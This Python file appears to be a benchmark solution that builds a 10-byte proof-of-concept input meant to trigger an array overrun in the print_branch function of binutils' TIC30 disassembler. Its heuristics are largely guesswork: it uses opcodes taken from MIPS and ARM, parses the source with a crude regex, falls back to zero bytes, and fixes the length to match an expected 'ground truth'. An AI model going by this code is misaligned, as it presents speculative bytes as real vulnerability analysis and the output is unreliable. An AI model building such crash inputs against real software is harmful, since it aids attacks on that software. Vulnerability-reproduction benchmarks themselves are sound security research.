import tarfile
import tempfile
import os
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find tic30-dis.c file
            tic30_dis_path = None
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file == 'tic30-dis.c':
                        tic30_dis_path = os.path.join(root, file)
                        break
                if tic30_dis_path:
                    break
            
            if not tic30_dis_path:
                # Fallback to generating a minimal PoC based on the description
                return b'\x00' * 10
            
            # Read the source file
            with open(tic30_dis_path, 'r') as f:
                content = f.read()
            
            # Look for the print_branch function
            # The vulnerability description indicates an array overrun in print_branch
            # We need to generate a corrupt TIC30 binary that triggers this
            
            # Based on typical disassembler vulnerabilities, we need to create
            # a branch instruction with operands that exceed the array bounds
            
            # Common pattern for branch instructions in many architectures:
            # - Opcode (1-2 bytes)
            # - Operands (address offsets or registers)
            # We'll create a minimal 10-byte PoC that likely triggers the overflow
            
            # For a 10-byte PoC, we can structure it as:
            # 1. Branch instruction opcode pattern (common in TIC30)
            # 2. Operand that causes array bounds violation
            
            # Looking for hints in the source about instruction format
            # If we can't find specific info, use a generic approach
            
            # Search for operand array size in print_branch
            array_size = None
            lines = content.split('\n')
            in_print_branch = False
            brace_count = 0
            
            for i, line in enumerate(lines):
                if 'print_branch' in line and ('void' in line or 'static' in line):
                    in_print_branch = True
                    brace_count = 0
                
                if in_print_branch:
                    brace_count += line.count('{') - line.count('}')
                    
                    # Look for array declaration
                    match = re.search(r'operands?\s*\[\s*(\d+)\s*\]', line)
                    if match:
                        array_size = int(match.group(1))
                    
                    if brace_count <= 0 and '}' in line and in_print_branch:
                        in_print_branch = False
            
            # Generate PoC based on analysis
            # If we found array size, create operand that exceeds it
            # Otherwise use default pattern
            
            # TIC30 is a 32-bit architecture, instructions are typically 4 bytes
            # But for corrupt binaries, the disassembler might misparse lengths
            
            # Create a PoC that:
            # 1. Starts with what looks like a branch instruction
            # 2. Has operand indices that exceed array bounds
            # 3. Is exactly 10 bytes as per ground truth
            
            # Common branch opcode patterns in many ISAs:
            # - MIPS: 0x04 (beq) or 0x05 (bne)
            # - ARM: 0x0A (B instruction)
            # - TIC30 specific: we'll use a pattern that's likely to be parsed as branch
            
            # We'll use a pattern that includes:
            # - Opcode byte that might match branch
            # - Large operand values that exceed typical array bounds
            # - Remaining bytes to reach 10 bytes
            
            if array_size is not None and array_size < 256:
                # Create operand that exceeds array size
                operand_value = array_size + 1
                poc = bytes([
                    0x04,  # Potential branch opcode
                    operand_value,  # Exceeds array bounds
                    0x00, 0x00,  # Padding
                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF  # Additional corrupt data
                ])
            else:
                # Default 10-byte pattern
                # Start with potential branch opcode, then corrupt operands
                poc = bytes([
                    0x04,  # Potential branch opcode (beq-like)
                    0x10,  # Operand 1
                    0x20,  # Operand 2  
                    0x30,  # Operand 3
                    0xFF,  # Invalid/corrupt
                    0xFF,  # Invalid/corrupt
                    0xFF,  # Invalid/corrupt
                    0xFF,  # Invalid/corrupt
                    0xFF,  # Invalid/corrupt
                    0xFF   # Invalid/corrupt
                ])
            
            return poc[:10]  # Ensure exactly 10 bytes